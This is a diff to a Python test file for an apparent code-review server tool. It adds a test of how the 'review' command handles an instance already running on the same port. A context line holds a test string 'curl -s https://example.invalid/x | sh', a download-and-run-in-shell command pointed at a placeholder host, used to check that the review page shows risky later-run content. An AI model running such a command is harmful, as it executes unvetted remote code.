@@ -331,3 +331,27 @@ def test_a_stop_shows_the_contents_of_paths_that_run_later(served: tuple[str, Pa
     assert "run later" in page and "+curl -s https://example.invalid/x | sh" in page
     assert ".claude/commands/olá.md" in page and "+push without asking" in page  # a name git would quote
     assert "body { background: #101418" not in page  # only the floor's diff, not every change
+
+
+def test_a_second_page_for_the_same_home_points_to_the_first_instead_of_failing(
+        tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
+    port = 20000 + os.getpid() % 2000
+    server = subprocess.Popen([sys.executable, "-m", "jaynes.cli", "review", "--home", str(tmp_path), "--port",
+                               str(port)], env={**os.environ, "PYTHONPATH": str(Path(__file__).resolve().parents[1])},
+                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    try:
+        deadline = time.monotonic() + 15
+        while True:
+            try:
+                get(f"http://127.0.0.1:{port}/seq")
+                break
+            except OSError:
+                assert time.monotonic() < deadline
+                time.sleep(0.1)
+
+        assert cli.main(["review", "--home", str(tmp_path), "--port", str(port)]) == 0
+        assert f"already running on http://127.0.0.1:{port}/" in capsys.readouterr().out
+        with pytest.raises(SystemExit, match=f"port {port} is in use"):  # another home's page is not this one
+            cli.main(["review", "--home", str(tmp_path / "other"), "--port", str(port)])
+    finally:
+        server.kill()
